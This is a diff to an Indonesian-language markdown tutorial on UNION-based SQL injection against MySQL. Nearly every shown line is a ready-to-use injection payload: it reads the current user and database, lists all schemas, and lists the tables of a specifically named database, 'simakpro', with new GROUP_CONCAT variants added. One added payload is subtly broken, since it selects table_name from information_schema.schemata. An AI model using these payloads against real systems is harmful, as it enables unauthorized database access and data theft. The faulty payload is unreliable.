@@ -11,14 +11,22 @@
 ' UNION ALL SELECT 1,2,3,user(),5,6,7,database(),9,10 #
 ```
 
-* Selanjutnya untuk mengetahui list database yang tersimpan pada MYSQL, menggunakan script berikut, Cth:
+* Selanjutnya, untuk mengetahui list database yang tersimpan pada MYSQL, menggunakan script berikut, Cth:
 ```bash
 ' UNION ALL SELECT 1,2,3,schema_name,5,6,7,8,9,10 FROM information_schema.schemata #
+```
+Atau, menggunakan script berikut, jika column output tidak memiliki perulangan, Cth:
+```bash
+' UNION ALL SELECT 1,2,3,GROUP_CONCAT(schema_name),5,6,7,8,9,10 FROM information_schema.schemata #
 ```
 
 * Selanjutnya, untuk mendapatkan list tables dari database tertentu, menggunakan script berikut, Cth:
 ```bash
 ' UNION SELECT 1,2,3,table_name,5,6,7,8,9,10 FROM information_schema.tables WHERE table_schema = 'simakpro' #
+```
+Atau, menggunakan script berikut, jika column output tidak memiliki perulangan, Cth:
+```bash
+' UNION ALL SELECT 1,2,3,GROUP_CONCAT(table_name),5,6,7,8,9,10 FROM information_schema.schemata #
 ```
 
 * Selanjutnya, untuk mendapatkan informasi yang lebih spesifik kolom-kolom dari sebuah table, menggunakan script berikut, Cth:
